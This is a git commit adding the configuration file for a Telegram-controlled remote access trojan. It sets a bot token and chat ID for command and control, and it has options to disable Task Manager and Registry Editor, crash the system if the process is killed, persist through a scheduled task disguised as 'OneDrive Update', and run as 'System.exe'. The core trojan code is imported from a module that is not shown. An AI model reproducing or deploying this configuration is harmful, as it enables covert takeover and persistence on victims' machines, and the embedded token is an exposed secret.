fdfa1e6cba56f623f13d06235681ad0c746f291c
dashfarhad <71177115+dashfarhad@users.noreply.github.com>
2022-08-27 08:48:48 +0430

    Add files via upload

---
+++ RAT.py
@@ -0,0 +1,38 @@
+from API import *
+
+
+# Token/ID
+TelegramToken = '5417976393:AAFRvZlT-ZZ5RKXZHNwesWI9QItP-7l0GMs'
+TelegramChatID = '990290134'
+
+
+# Run the script as administrator
+AdminRightsRequired = False
+
+# Disable Task Manager at first start
+DisableTaskManager = False
+# Disable Registry Editor at first start
+DisableRegistryTools = False
+
+# Process protection from termination and deletion
+ProcessBSODProtectionEnabled = False
+
+
+# Add to startup at first start
+AutorunEnabled = False
+# Installation directory
+InstallPath = 'C:\\ProgramData\\'
+# Task name in Task Scheduler
+AutorunName = 'OneDrive Update'
+# The name of the process in the Task Manager
+ProcessName = 'System.exe'
+
+
+# Display a message at first start
+DisplayMessageBox = False
+# Your Message (will be displayed at start)
+Message = 'Message'
+
+
+# Directory for saving trojan temporary files
+Directory = 'C:\\program\\'
